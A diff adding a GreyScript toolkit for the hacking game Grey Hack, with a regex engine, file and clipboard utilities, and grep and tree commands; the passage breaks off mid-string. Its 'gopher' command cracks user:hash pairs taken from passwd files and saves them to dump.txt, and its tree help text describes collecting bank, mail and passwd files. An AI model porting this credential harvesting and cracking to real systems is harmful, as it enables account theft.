@@ -1,0 +1,2843 @@
+if DEBUG then print("<size=75%>loading dtools.5pk v 3.9.9.2...(147.127)</size>")
+// regex engine for greyscript
+// useage: re.match( String: regex pattern, Char Array (list): text to parse )
+// returns 1 if match and 0 if no match
+re = {}
+re.match = function(regexp, text) 
+	if DEBUG then print("<b> in globals.re(gex)")
+  if regexp[0] == "^" then
+		regexp.pull
+		return re.match_here(regexp,text)
+	end if
+  while text.len > 0
+    if re.match_here(regexp, text) then return 1
+		text.pull
+  end while
+  return 0
+end function
+re.match_here = function(regexp, text)
+  if not regexp then return 1
+  if regexp.len > 1 and regexp[1] == "#" then 
+		return self.match_star(regexp[0], regexp[2:], text)
+	end if
+  if regexp[0] == "$" and not regexp.hasIndex(1) then
+    if text.hasIndex(1) then return 0 else return 1
+  end if
+  if text.len > 0 and (regexp[0] == "*" or regexp[0] == text[0]) then 
+		return self.match_here(regexp[1:], text[1:])
+	end if
+  return 0
+end function
+re.match_star = function(c, regexp, text)
+  while text.len and (text[0] == c or c == "*") 
+    if re.match_here( regexp, text) then return 1
+    text = text[1:]
+  end while
+  return 0
+end function
+if DEBUG then print("<size=75%>loaded regex engine...</size>")
+command.poke = function(arg1, arg2, arg3=0, arg4=0)
+	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "<u>touch || poke || makefile || overwrite</u>"+char(10)+"Usage: poke [/path/to/file] [opt: string] -- create file in path and optionally set contents to string."+char(10)+"Usage: poke test.txt -- creates text.txt in the current path"+char(10)+"poke test.txt hello -- creates test.txt and sets content to hello"+char(10)+"Advanced: ls -la /virt | poke test.txt -- creates test.txt and pipes the output of ls -la /virt into it"+char(10)+"N.B. if file already exists then contents will be <b>overwritten</b> if string supplied."+char(10)+"n.b.b. if string is more than one word use piping to supply string."+char(10)+"<b>Advanced:</b> poke -f [path_to_existing_file] [content] -- will skip the overwrite prompt"+char(10)+"Advanced: poke -n [path] -- create path and/or set content to null."+char(10)+"-- overwrites file content with a null character."
+	skip = false
+	if arg1 == "-f" then 
+		arg1 = arg2
+		arg2 = arg3
+		arg3 = arg4
+		skip = true
+	end if
+	if arg1 == "-n" then
+		if not arg2 then return "poke: -n option requires a valid path to a file."
+		arg1 = arg2
+		arg2 = "!!nullify!!23tqg43qg34g!!"
+	end if
+	destination = null
+	final_name = null
+	dest = globals.get_file(arg1)
+	if not dest then
+		split = arg1.split("/")
+		if DEBUG then print("split: "+split)
+		final_name = split.pop
+		if DEBUG then print("final name: "+final_name)
+		//if split.len and split[0] == "" then dest = globals.get_file(split.join("/")) else dest = globals.get_file(split.join("/")) /// fix it
+		if split.len then dest = globals.get_file(split.join("/")) 
+		if DEBUG then print("dest: ["+dest+"]")
+		if not dest then
+			if split.len and split[0] == "" then destination = "/" else destination = currentPath
+		else
+			destination = dest.path
+		end if
+	else
+		if dest.is_folder then
+			return "poke: "+arg1+" is a folder."
+		else
+			destination = dest.parent.path
+			final_name = dest.name
+		end if
+	end if
+
+	dest_folder = globals.get_file(destination)
+	if not dest_folder then return("poke: destination path not found")
+	if not dest_folder.has_permission("w") then return("poke: permission denied")
+	try = localmachine.touch(dest_folder.path, final_name)
+	if try != 1 then
+		print("poke: "+try)
+		// if arg2 then
+		// 	if try == "The file already exists" and skip != true and user_input("overwrite contents? [Y/n] ||: ",0,1).lower == "n" then
+		// 		return "aborting..."
+		// 	end if
+		// end if
+	end if
+  	dest_name = ""
+	if dest_folder.path != "/" then dest_name = "/"+final_name else dest_name = final_name
+	output = globals.get_file(dest_folder.path+dest_name)
+	if not output then return "poke: write error"
+	if arg2 and output.has_permission("w") then
+    	if arg2 == "!!nullify!!23tqg43qg34g!!" then arg2 = ""
+    		if output.is_binary then
+      		return "poke: can't poke a binary file."
+    	else
+      		output.set_content(arg2)
+    	end if
+  	else
+    	if arg2 then return "poke: permission denied."
+  	end if
+	return output
+end function
+command.merge = function(arg1, arg2, arg3=0, arg4=0)
+	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "Usage: merge file_path_1 file_path_2 --  combine files. file_1 will have file_2 appended to it."
+	file1 = localmachine.File(arg1)
+	file2 = localmachine.File(arg2)
+	if file1 and file2 then
+		catch = file1.set_content( file1.get_content.trim + file2.get_content.trim )
+	else
+		return("Check path(s) and try again.")
+	end if
+	return catch
+end function
+command.append = function(arg1, arg2, arg3=0, arg4=0)
+	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "Usage: append [path_to_file] [text] (works best with pipe) --  add text to end of file."+char(10)+"Usage: append [file_object] [text] -- append text to file object"+char(10)+"-- pipe file object to clipa/b/c and use @a/b/c to reference"+char(10)+"-- eg: clipb @B 1 -- where BUFFER[1] is a file, then: append @b [text]"+char(10)+"Usage: append @clipa|b|c [text] -- append to the end of a clip space."+char(10)+"N.B.<b> @clipa and @clipc will append text directly with no new line. </b>"+char(10)+" -- @clipb will add a new line and then append text."
+	path_to_file = arg1
+	buf = arg2
+	if path_to_file == "@clipa" then
+		globals.clip_board_alpha = globals.clip_board_alpha+buf
+		return "clipped:"+char(10)+globals.clip_board_alpha
+	end if
+	if path_to_file == "@clipb" then
+		globals.clip_board_beta = globals.clip_board_beta+char(10)+buf
+		return "clipped:"+char(10)+globals.clip_board_beta
+	end if
+	if path_to_file == "@clipc" then
+		globals.clip_board_gamma = globals.clip_board_gamma+buf
+		return "clipped:"+char(10)+globals.clip_board_gamma
+	end if
+  if typeof(path_to_file) == "file" then file = path_to_file
+	if typeof(path_to_file) == "string" then file = globals.get_file(path_to_file)
+	if not file then return "404: file not found"
+	if file.get_content == "" then return file.set_content(buf)
+	return file.set_content(file.get_content+char(10)+buf)
+end function
+command.dfit = function(arg1, arg2, arg3=0, arg4=0)
+	if arg1 == "-h" or arg1 == "help" then return "Usage: dfit [path_to_file]"+char(10)+"Takes text file and splits contents by newline, joins by comma and outputs to a.csv by default."+char(10)+"As the name suggests, this is for making dictionary files. Output is a csv (comma separated values) file."
+	df = null
+	if arg1 then
+		df = arg1
+	else
+		return "Usage: dfit [path_to_file]"
+	end if
+	dump = localmachine.File(currentPath+"/"+df)
+	if not dump then
+		dump = localmachine.File(df)
+		if not dump then return(df+" not found.")
+	end if
+	P_LIST = []
+	outFileName = user_input("Enter outfile name or leave blank for a.csv: "+char(10))
+	if outFileName == "" or outFileName == " " then outFileName = "a.csv"
+	print("Scanning...")
+	lines = dump.get_content.split(char(10))
+	print("Found "+lines.len+" lines. Sorting... ")
+	for pw in lines
+		if pw == "" then continue
+		P_LIST.push(pw.trim)
+	end for
+	get_shell.host_computer.touch(currentPath,outFileName)
+	outfile = get_shell.host_computer.File(currentPath+"/"+outFileName)
+	if not outfile then return "Error: check write permissions"
+	outfile.set_content(P_LIST.join(","))
+	return (char(10)+"File "+outFileName+" saved. ")
+end function
+command.chop = function(arg1, arg2=0, arg3=0, new_name=0)
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return "<u><b>CHOP || DELIMITER || FILE TOOLS || clipboard tools"+char(10)+
+	"Usage: chop [input] [index] [delimiter] [output]"+char(10)+
+	colorGreen+"Usage: chop [path_to_file|@clipa|b|c] [index] [delimiter] [output_filename] -- chop a file"+char(10)+
+	"<color=green>param: <color=white>path_to_file</color> -- file to chop"+char(10)+
+	"-- if path_to_file is @clipa, @clipb, or @clipc it will chop the clipboard instead"+char(10)+
+	"-- clipboard contents must be a string"+char(10)+
+	"<color=green>param: <color=white>index</color> -- keep column of elements at index of split"+char(10)+
+	"-- default: 0"+char(10)+
+	"<color=green>param: <color=white>delimiter</color> -- split each line at this pattern"+char(10)+
+	"-- default: char(32) aka a sapce"+char(10)+
+	"-- to use char(10) as a delimiter pass ""/n"" or a piped newline for the delimiter parameter"+char(10)+
+	"-- one way to pipe a newline is: <b>code -c 10 | clipa</b> -- this will place a newline in the clipboard"+char(10)+
+	"---- then:<b> chop [path] [index] @a [outpath]"
+	"<color=green>param: <color=white>output_filename</color> -- name for outfile"+char(10)+
+	"-- prompts for output filename if not supplied"+char(10)+
+	"-- outputs to current path with filename: output_filename "+char(10)+
+	"-- output_filename may be @clipa, @clipb, or @clipc to output to clipboards instead"+char(10)+char(10)+
+	"Usage Example: text to chop:"+char(10)+char(10)+
+	"big bada boom"+char(10)+
+	"ding dong daddy"+char(10)+
+	"abracadabra"+char(10)+char(10)+
+	"* and: index is 1, delimiter is: 'da'"+char(10)+
+	"* the output would be:"+char(10)+char(10)+
+	"boom"+char(10)+
+	"dy"+char(10)+
+	"bra"+char(10)
+	if DEBUG then print "debug: in chop"
+	file = null
+	clipping = false
+	if typeof(arg1) == "string" then
+		if arg1 == "@clipa" or arg1 == "@clipb" or arg1 == "@clipc" then
+			clipping = true
+		else
+			file = globals.get_file(arg1)
+			if not file then return "404: file not found"
+		end if
+	else
+		return "chop: arg1 must be string: /path or string: @clipa/b/c"+char(10)+"clipa/b/c contents must be string."
+	end if
+	if not new_name then new_name = user_input("Enter output file name or press <<b>return</b>> for: "+arg1.remove("@")+".chop "+char(10)+"Enter @clipa or @clipb or @clipc to send output to clip space."+char(10)+":> ",0,0)
+	if new_name == "" then new_name = arg1.remove("@")+".chop"
+	new_file = null
+	if new_name == "@clipa" or new_name == "@clipb" or new_name == "@clipc" then
+		new_file = new_name
+	else
+		localmachine.touch(currentPath, new_name)
+		new_file = globals.get_file(new_name)
+		if not new_file then return "chop: could not write output file. access denied. check write permissions or path and try again."
+	end if
+	if clipping == true then
+		if arg1 == "@clipa" then
+			if typeof(globals.clip_board_alpha) == "string" then data = globals.clip_board_alpha.replace(char(160),char(32)).split(char(10)) else return "chop: clipa contents incompatible. expects string."
+		end if
+		if arg1 == "@clipb" then
+		  if typeof(globals.clip_board_beta) == "string" then data = globals.clip_board_beta.replace(char(160),char(32)).split(char(10)) else return "chop: clipb contents incompatible. expects string."
+		end if
+		if arg1 == "@clipc" then
+			if typeof(globals.clip_board_gamma) == "string" then data = globals.clip_board_gamma.replace(char(160),char(32)).split(char(10)) else return "chop: clipc contents incompatible. expects string."
+		end if
+	else
+		data = file.get_content.replace(char(160),char(32)).split(char(10))
+	end if
+	if DEBUG then print "debug: data: "+data
+	out = []
+	del = char(32)
+	if arg3 then del = arg3
+	if del == char(10) then del = "/n"
+	if DEBUG then print "debug: del: "+del
+	//print("del: "+del)
+	inde = 0
+	if arg2 then inde = arg2.to_int
+	if typeof(inde) != "number" then inde = 0
+	if del == "/n" then
+		if DEBUG then print "debug: del is a newline"
+		if data.hasIndex(inde) then out.push( data[inde] )
+	else
+		for line in data
+			if line == "" then continue
+			//print("Chopping "+line)
+			l_split = str(line).split(del)
+			i = 0
+			fix = []
+			for c in l_split
+				if c != "" then fix.push(l_split[i])
+				i = i + 1
+			end for
+			//print(fix)
+			if fix.hasIndex(inde) then out.push(fix[inde])
+		end for
+	end if
+	if DEBUG then print "debug: writing output"
+	if typeof(new_file) == "file" then
+		//print("error: "+new_file)
+		print "chop: saving contents to "+colorWhite+new_file.path
+		print new_file.set_content(out.join(char(10)))
+		print "chop: saved:"
+		return new_file.get_content
+	else
+		if new_file == "@clipa" then return command.clipa(out.join(char(10)))
+		if new_file == "@clipb" then return command.clipb(out.join(char(10)))
+		if new_file == "@clipc" then return command.clipc(out.join(char(10)))
+	end if
+end function
+command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Gopher: decipher tool"+char(10)+"Usage: gopher [/path/to/file|file_object|hash_string|hash_list|@tbuf] -- decipher hashes using onboard dictionary or crypto.decipher."+char(10)+"-- outputs to /current_path/dump.txt"+char(10)+"-- see cerebrum for dictionary options."+char(10)+"-- gopher [/path] -- decipher contents of path"+char(10)+"-- gopher [object] -- decipher piped file object"+char(10)+"-- gopher [list] -- decipher piped list of strings"+char(10)+"-- gopher [string] -- decipher hash string (with or without preceding user: )"+char(10)+"-- gopher @tbuf -- deciphers contents of @tbuf"+char(10)+"-- tbuf is set when <b>tree</b> encounters a user:hash pair in /home or /etc/passwd"+char(10)+"-- eg: gopher user:ee11cbb19052e40b07aac0ca060c23ee or gopher ee11cbb19052e40b07aac0ca060c23ee"+char(10)+"N.B. function takes string, file_object, list. function writes to dump.txt. function returns string."+char(10)+"Advanced: gopher runs recursively on each line therefore each line of a file or list or string may:"+char(10)+"-- be a user:hash string"+char(10)+"-- be a hash string"+char(10)+"-- be a path to a file"+char(10)+"-- contain a list of the aforementioned types"
+	if not globals.crypto then print( "Warning: Crypto: not found" )
+	data = []
+	if typeof(arg1) != "string" and typeof(arg1) != "list" and typeof(arg1) != "file" then return "gopher: invalid input: expects string, file, or list "
+	if DEBUG then print("top of gopher")
+	if arg1 == "@tbuf" then arg1 = globals.T_BUF // deprecated, @tbuf is now a callable variable, however this remains so that @tbuf may be used in an internal call
+	if typeof(arg1) == "file" then
+		if arg1.has_permission("r") then data = arg1.get_content.split(char(10)) else return "gopher: can't read "+arg1+": permission denied."
+	end if
+	if typeof(arg1) == "string" then
+		fpath = globals.get_file(arg1)
+		if fpath and typeof(fpath) == "file" then
+			if DEBUG then print("gopher: found file: "+fpath.path)
+			if fpath.has_permission("r") then data = fpath.get_content.split(char(10)) else return "gopher: can't read "+fpath.path+": permission denied."
+		else
+			if DEBUG then print("in gopher: is_string: arg1 is: "+arg1+" which is a "+typeof(arg1)+" of length: "+arg1.len)
+			if arg1.len == 32 then // hash string
+				data = arg1
+			else 
+				if arg1.indexOf(char(10)) >= 0 then 
+					data = arg1.split(char(10))
+				else 
+					if arg1.indexOf(":") and arg1.len > 32 then data = arg1 else return "gopher: skipping invalid string"
+				end if
+			end if
+		end if
+	end if
+	if typeof(arg1) == "list" then
+		data = arg1 
+	end if 
+	if DEBUG then print("data type is: "+typeof(data))
+	if typeof(data) == "list" then
+		for element in data 
+			if element == "" or element == " " then continue
+			if DEBUG then print "debug: gopher loop is looping on element: "+char(10)+element
+			if is_valid_ip(element.split("@")[0]) then 
+				print "gopher: skipping ip address line" 
+				continue
+			end if
+			wait(.1)
+			print "gopher: going for it..."
+			ctc = (command.gopher( element ))
+			if ctc then print ctc
+		end for
+	end if
+	if typeof(data) == "string" then 
+		print("gopher: deciphering:<b> "+data)
+		user = "unknown_user"
+		if data.indexOf(":") then
+		data = data.split(":")
+		user = data[0]
+		data = data[1]
+		end if 
+		if data.len != 32 then return "gopher: skipping invalid hash string"
+		pass = command.md5("-d",data) // decipher here
+		output = user + ":" + pass + ":"+data
+		print("["+colorGold+user+":"+colorGold+pass+CT+":"+data+"]")
+		dump = command.tree("/","dump.txt","1","n")
+		if not dump then 
+			command.poke("dump.txt")
+			dump = globals.get_file("dump.txt")
+		end if
+		if dump and typeof(dump) == "file" and dump.has_permission("w") then //and dump.has_permission("r") then 
+			print("gopher: saving data to "+dump.path)
+			print command.append(dump,output)
+		else 
+			print "gopher: failed to write to dump.txt; check permissions"
+		end if
+	end if 
+	return 0
+end function
+command.grep = function(a1, a2, arg3=0, arg4=0)
+	find_file = false
+	return_name = false
+	return_path = false
+	globals.grepped_file = null
+	if a1 and a1 == "-f" or a1 == "-n" or a1 == "-fn" or a1 == "-p" or a1 == "-fp" then
+		find_file = true 
+		if a1 == "-n" or a1 == "-fn" then return_name = true
+		if a1 == "-p" or a1 == "-fp" then return_path = true
+		if DEBUG then print "debug: grep: findfile == true"
+		a1 = a2
+		a2 = arg3
+		if not a2 then a2 = "/"
+	end if
+	if not a1 then return "grep: input error"
+	if a1 == "-h" or a1 == "help" then return "GREP || get regular expression || regex"+char(10)+
+		colorCyan+"Usage: grep [opt:-f|-n|-p] [pattern] [opt: search_path (default: / ) | object] "+char(10)+
+		"-- supports partial matches and limited regular expressions."+char(10)+char(10)+
+		"Usage: grep [pattern] [search_path|object] -- grep for text in files and folders"+char(10)+
+		"-- searches for text matching a given pattern"+char(10)+
+		"-- returns all matching text, with line numbers and positions, found in search_path"+char(10)+
+		"-- search_path may be a file, or folder, or object"+char(10)+
+		"-- descends folders and files from search_path"+char(10)+
+		"-- descends from <b>/</b> on object if search_path is a shell or computer object"+char(10)+
+		"-- descends from path of file if search_path is a file object"+char(10)+char(10)+
+		"Usage: grep [-f] [pattern] [search_path|object] -- grep for file"+char(10)+
+		"-- searches search_path or piped object for a <b>file</b> with name matching pattern "+char(10)+
+		"-- piped computer and shell objects will be searched from the <b>/</b> directory."+char(10)+
+		"-- piped file objects will be searched from the path of the file."+char(10)+
+		"-- returns a <b>file object</b> for the first match in the file tree"+char(10)+	
+		"---- what coutns as a first match is still a w.i.p...."+char(10)+char(10)+
+		"Usage: grep [-n|-fn] [pattern] [search_path|object] -- grep for file name"+char(10)+
+		"-- searches search_path for file with name matching pattern"+char(10)+
+		"-- returns the <b>file name</b> as a string"+char(10)+
+		"-- uses the same search method as -f"+char(10)+
+		"-- the -fn option is equivalent to the -n option"+char(10)+char(10)+
+		"Usage: grep [-p|-fp] [pattern] [search_path|object] -- grep for file path"+char(10)+
+		"-- searches search_path for file with name matching pattern"+char(10)+
+		"-- returns the <b>file path</b> as a string"+char(10)+
+		"-- uses same search method as -f"+char(10)+
+		"-- -fp option is equivalent to -p option"+char(10)+char(10)+
+		colorCyan+"<u>current regex tokens (more planned):</u>"+char(10)+
+		"c   matches any literal character 'c'"+char(10)+
+		"-- bob matches bob anywhere in the text."+char(10)+
+		"^   match pattern from beginning of word"+char(10)+
+		"-- ^ber matches bertha  does not match robert"+char(10)+
+		"$   match end of line (goes at end of pattern)"+char(10)+
+		"-- .txt$ matches file.txt does not match file.txt.src"+char(10)+
+		"#   matches one or more of <b>preceding</b> character"+char(10)+
+		"-- c# matches c, cc, ccc, cccc "+char(10)+
+		"*   matches any unicode char (wildcard)"+char(10)+
+		"-- *#:*#  matches root:password, email@domain.com:password, xyz:1234"+char(10)+
+		"- - - - - - - - - - - - - - - - - - - - - - - - - "+char(10)+
+		"Important! Runtime depends on length of pattern and size of text to check. "+char(10)+
+		"Since grep will recurse any folders in a given path, this command could result in very long run times. "+char(10)+
+		"It is up to you to limit the scope of your searches accordingly."+char(10)
+			
+	gresult = []
+	gname = null
+
+	gp = function(grep_tar, t_f, use_re, findfile)
+		if DEBUG then print "debug: in gp"
+		if t_f.is_folder and t_f.is_binary then
+			sub_folders = t_f.get_folders
+			sub_files = t_f.get_files
+			g_buf = null
+    		if globals.grepped_file != null then return 
+			for sub in sub_folders
+				if use_re == true then
+					if re.match(grep_tar.values, sub.name.values) then 
+						//gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+					if NIGHTLY == true and sub.is_symlink then 
+						gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+sub.name+CT+colorLightBlue+" linked to folder in: "+ sub.parent.path + CT+char(10)+colorGold+"               |<u>"+sub.path)
+					else
+						gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+					end if
+						if findfile == true then
+							print gresult[-1]
+							globals.grepped_file = sub
+							gname = sub.name
+							if DEBUG then print "debug: found "+sub.path
+							return
+						end if
+					end if
+				else
+					if sub.name == grep_tar or sub.name.indexOf(grep_tar) then 
+						//gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
+					if NIGHTLY == true and sub.is_symlink then 
+						gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+sub.name+CT+colorLightBlue+" linked to folder in: "+ sub.parent.path + CT+char(10)+colorGold+"               |<u>"+sub.path)
+					else 
+						gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path+CT)
+					end if
+					if findfile == true then
+						if DEBUG then print "debug: found "+sub.path
+						print gresult[-1]
+						globals.grepped_file = sub
+						return
+						end if
+					end if
+				end if
+				gp(grep_tar, sub, use_re, findfile)
+			end for
+			for f in sub_files
+				if use_re == true then
+					if re.match(grep_tar.values, f.name.values) then 
+            			//gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						if NIGHTLY == true and f.is_symlink then 
+							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+f.name+CT+colorLightBlue+" linked to file in: "+ f.parent.path + CT+char(10)+colorGold+"               |<u>"+f.path)
+						else 
+							gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						end if
+						if findfile == true then
+							if DEBUG then print "debug: found "+f.path
+							print gresult[-1]
+							globals.grepped_file = f
+							return
+						end if
+          			end if
+				else
+					if f.name == grep_tar or f.name.indexOf(grep_tar) >= 0 then 
+						//gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						if NIGHTLY == true and f.is_symlink then 
+							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+f.name+CT+colorLightBlue+" linked to file in: "+ f.parent.path + CT+char(10)+colorGold+"               |<u>"+f.path)
+						else 
+							gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
+						end if
+						if findfile == true then
+							if DEBUG then print "debug: found "+f.path  
+							print gresult[-1]
+							globals.grepped_file = f
+							return
+						end if
+          			end if
+				end if
+				gp(grep_tar, f, use_re, findfile)
+			end for
+		end if
+		if t_f.is_binary or findfile == true then return
+		buf = t_f.get_content
+		if buf == "" or buf == null then return
+		lines = buf.split(char(10))
+		for line in lines
+			words = line.split(" ")
+			for word in words
+				if use_re == true then
+					if re.match(grep_tar.values, word.values) then gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
+				else
+					if word == grep_tar or word.indexOf(grep_tar) >= 0 then gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
+				end if
+			end for
+		end for
+  	end function
+	
+	output = "No "+a1+" found."
+	t_f = null // target file or folder
+	grep_tar = a1.trim
+	invoke_regex = false
+	special_chars = ["*","^","$","#"] // * changed to #, . changed to *
+	for special in special_chars
+		if grep_tar.indexOf(special) >= 0 then invoke_regex = true
+	end for
+  	if not a2 then a2 = "/"
+	tf_path = a2
+	if typeof(tf_path) == "string" then
+		t_f = globals.get_file(tf_path)
+		if not t_f then return "grep: "+a2+" not found."
+	end if
+	// piped object handling. Unused if run as standalone but if baked into your own script, pipe objects to grep them.
+	if typeof(tf_path) == "file" then t_f = tf_path
+	if typeof(tf_path) == "computer" then t_f = tf_path.File("/")
+	if typeof(tf_path) == "shell" then t_f = tf_path.host_computer.File("/")
+	if typeof(t_f) != "file" then return "grep: "+a2+": unkown type."
+	// end piped object handling.
+	if DEBUG then print "debug: gresult is: "+gresult
+	gp(grep_tar, t_f, invoke_regex, find_file)///////////////////////////////fire away!
+  	if DEBUG then print "debug: ggf: "+typeof(globals.grepped_file)
+  	if globals.grepped_file then 
+		if return_name then return globals.grepped_file.name
+		if return_path then return globals.grepped_file.path
+ 	 	return globals.grepped_file
+	end if
+	if gresult != [] then output = gresult.join(char(10))
+	return output
+end function
+// command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
+// 	if arg1 == "-h" or arg1 == "help" then return "<b><u>tree || list files || file grep"+char(10)+
+// 	"Usage: <b>tree</b> -- view filesystem tree (from / if no argument)"+char(10)+
+// 	"Usage: tree [path|object] -- view filesystem from path down"+char(10)+
+// 	"Usage: tree [opt: path(string)|object(object)] [opt: grep_target(string)] [quiet: 1|0] [opt: r|y|n]"+char(10)+
+// 	"-- [path] - path to descend"+char(10)+
+// 	"-- [object] - shell or computer: descends from / on object"+char(10)+
+// 	"-- [object] - file: descends from path of file object on said object"+char(10)+
+// 	"-- [grep_target] - search for target file by name"+char(10)+
+// 	"---- matches exact name (no regex)"+char(10)+
+// 	"---- <b>returns the file as an object if found</b>"+char(10)+
+// 	"-- [1|0] -  1 = quiet, supress output"+char(10)+
+// 	"-- [1|0] -  0 = verbose, print output"+char(10)+
+// 	"-- [r|n|y] - r = send to t_buf, n = ignore, y = decipher (default is <b>r</b>)"+char(10)+
+// 	"---- this option determines where bank.txt, mail.txt, passwd, and others are stored when encountered"+char(10)+
+// 	"---- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+
+// 	"-- e.g:<b> tree / database.csv 1 N | file -b</b> "+char(10)+
+// 	"---- find database.csv on filesystem, display properties, pipe to BUFFER"+char(10)+
+// 	"N.B. You may use @a, @b, @c or @clipa, @clipb, @clipc to reference [object]"+char(10)+
+// 	colorGreen+"-- -- -- -- -- --"+char(10)+
+// 	"<b>New: tree -f [path|object] [object|path] [opt: 1|0 ] - tree a directory or object and enumerate all files "+char(10)+
+// 	"-- omitting path|object (and opt) defaults to the / path"+char(10)+
+// 	"-- [opt: 1] - quiet mode. suppress output."+char(10)+
+// 	"-- [opt: 0] - print output. default"+char(10)+
+// 	"---- omitting this option will print output"+char(10)+
+// 	"-- enumerates to the enum buffer. see <b>enum -h</b> for instructions on how to use it"+char(10)+
+// 	"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "+char(10)+
+// 	"Usage: tree -f [path] -- tree from path, enumerate to enum, print output"+char(10)+
+// 	"Usage: tree -f [object] -- tree from object's <b>/</b> directory, enumerate, print output"+char(10)+
+// 	"Usage: tree -f [object|path] [1|0]-- performs as above but does <b>not</b> print output"+char(10)+
+// 	"Usage: tree -f [path|object] [object|path] -- tree from object's [path] directory, enumerate, print output"+char(10)+
+// 	"       -- this option will return the file or folder at path as an object if it exists"+char(10)+
+// 	"Usage: tree -f [param] [param] [1|0] -- performs as above but does <b>not</b> print output"+char(10)+
+// 	"N.B. tree -f [1] is ignored because it results in absolutely nothing happening"+char(10)+
+// 	"n.b. tree -f returns a string except as stated above"
+// 	tem = null
+// 	use_new_tree = false
+// 	if arg1 == "-f" then 
+// 		use_new_tree = true 
+// 		arg1 = arg2 
+// 		arg2 = arg3 
+// 		arg3 = arg4 
+// 		// new tree stuff goes here
+		
+
+// 	end if 
+// 	if arg1 then
+// 		if arg1 == "@clipa" or arg1 == "@a" then arg1 = globals.clip_board_alpha
+// 		if arg1 == "@clipb"  or arg1 == "@b" then arg1 = globals.clip_board_beta
+// 		if arg1 == "@clipc"  or arg1 == "@c" then arg1 = globals.clip_board_gamma
+// 		if typeof(arg1) == "string" then tem = localmachine.File(arg1)
+// 		if typeof(arg1) == "shell" or typeof(arg1) == "ftpshell" then tem = arg1.host_computer.File("/")
+// 		if typeof(arg1) == "computer" then tem = arg1.File("/")
+// 		if typeof(arg1) == "file" then tem = arg1
+// 	else
+// 		tem = localmachine.File("/")
+// 	end if
+// 	if not tem or not p_validate(tem,"size") then return "tree: invalid path or file"
+// 	if arg3 == "0" then arg3 = 0
+// 	if use_new_tree == true then return globals.newtree(tem,arg2)
+// 	globals.grepped_file = null
+// 	globals.list_files(tem, arg2, arg3, arg4)
+// 	if arg2 and globals.grepped_file and globals.grepped_file.name == arg2 then return globals.grepped_file
+// 	return 0
+// end function
+command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
+	if arg1 == "-h" or arg1 == "help" then return "<b><u>tree || list files || file grep"+char(10)+
+	"Usage: <b>tree</b> -- view filesystem tree (from / if no argument)"+char(10)+
+	"Usage: tree [path|object] -- view filesystem from path down"+char(10)+
+	"Usage: tree [opt: path(string)|object(object)] [opt: grep_target(string)] [quiet: 1|0] [opt: r|y|n]"+char(10)+
+	"-- [path] - path to descend"+char(10)+
+	"-- [object] - shell or computer: descends from / on object"+char(10)+
+	"-- [object] - file: descends from path of file object on said object"+char(10)+
+	"-- [grep_target] - search for target file by name"+char(10)+
+	"---- matches exact name (no regex)"+char(10)+
+	"---- <b>returns the file as an object if found</b>"+char(10)+
+	"-- [1|0] -  1 = quiet, supress output"+char(10)+
+	"-- [1|0] -  0 = verbose, print output"+char(10)+
+	"-- [r|n|y] - r = send to t_buf, n = ignore, y = decipher (default is <b>r</b>)"+char(10)+
+	"---- this option determines where bank.txt, mail.txt, passwd, and others are stored when encountered"+char(10)+
+	"---- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+
+	"-- e.g:<b> tree / database.csv 1 N | file -b</b> "+char(10)+
+	"---- find database.csv on filesystem, display properties, pipe to BUFFER"+char(10)+
+	"N.B. You may use @a, @b, @c or @clipa, @clipb, @clipc to reference [object]"+char(10)+
+	colorGreen+"-- -- -- -- -- --"+char(10)+
+	"<b>New: tree -f [path|object] [opt: 1|0 ]"+char(10)+
+	"-- tree a directory or object and enumerate all files "+char(10)+
+	"-- omitting path|object, and opt defaults to the / path"+char(10)+
+	"-- [opt: 1] - quiet mode; suppress output."+char(10)+
+	"-- [opt: 0] - print output; default"+char(10)+
+	"---- omitting this option will default to printing output"+char(10)+
+	"-- enumerates to the enum buffer"+char(10)+
+	"---- see <b>enum -h</b> for instructions on how to use it"+char(10)+
+	"- - - - - - - - - - - - - - - - - - - <b>details</b> - - - - - - - - - - - - - - - - - - - "+char(10)+
+	"Usage: tree -f [path] -- trees from path, enumerates file objects to enum, prints output"+char(10)+
+	"-- returns string"+char(10)+
+	"Usage: tree -f [object] -- trees from object's <b>/</b> directory, enumerates, prints output"+char(10)+
+	"-- returns string"+char(10)+
+	"Usage: tree -f [path|object] [1]-- performs as above but does <b>not</b> print output"+char(10)+
+	"-- returns 0"+char(10)+
+	"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "+char(10)+
